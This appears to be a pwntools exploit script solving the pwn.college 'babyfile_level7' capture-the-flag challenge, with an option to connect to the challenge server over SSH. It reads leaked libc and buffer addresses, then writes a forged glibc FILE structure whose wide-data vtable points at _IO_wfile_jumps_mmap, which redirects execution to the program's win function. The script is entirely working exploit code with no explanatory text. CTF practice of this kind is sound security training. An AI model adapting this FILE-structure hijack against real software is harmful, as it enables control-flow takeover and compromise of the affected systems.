from pwn import *
from time import sleep
context.binary=e=ELF("./babyfile_level7")
libc=e.libc
gs="""
set listsize 50
set $glibc_src_dir="../../glibc-2.31/"
source ~/add_src.py
b fwrite
b _IO_wdoallocbuf
"""
_IO_EOF_SEEN=0x0010
_IO_NO_READS=0x0004
_IO_CURRENTLY_PUTTING=0x0800
_IO_IS_APPENDING=0x1000
_IO_IN_BACKUP=0x0100
_IO_FLAGS2_NOTCANCEL=2
_IO_MAGIC=0xFBAD0000 
_IO_MAGIC_MASK=0xFFFF0000
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfile_level7")
p.recvuntil(b"[LEAK] The address of puts() within libc is: 0x")
libc.address=int(p.recvuntil(b"\n").decode(),16)-libc.sym.puts
log.info(f"libc @ {hex(libc.address)}")
sleep(1)
p.recvuntil(b"[LEAK] The name buffer is located at: 0x")
buf_=int(p.recvuntil(b"\n").decode(),16)
p.recvuntil(b"fp -> 0x")
fp=int(p.recvuntil(b"\n").rstrip().decode(),16)
p.recvuntil(b"0x88\t_lock")
p.recvuntil(b" = 0x")
_lock=int(p.recvuntil(b"\n").rstrip().decode(),16)
p.sendafter(b"Please enter your name.\n",
                p64(buf_)+
                b"\0"*(104-8)+p64(e.sym.win))
p.sendafter(b"Now reading from stdin directly to the FILE struct.",
               p32(1)+
               b"\0"*(130-4)+b"\x00"+
               b"\0"*(136-131)+p64(e.sym.buf+56+8)+
               b"\0"*(160-136-8)+p64(buf_-224)+
               b"\0"*(192-168)+p32(0)+
               b"\0"*(216-192-4)+
               p64(libc.sym._IO_wfile_jumps_mmap)
)
p.interactive()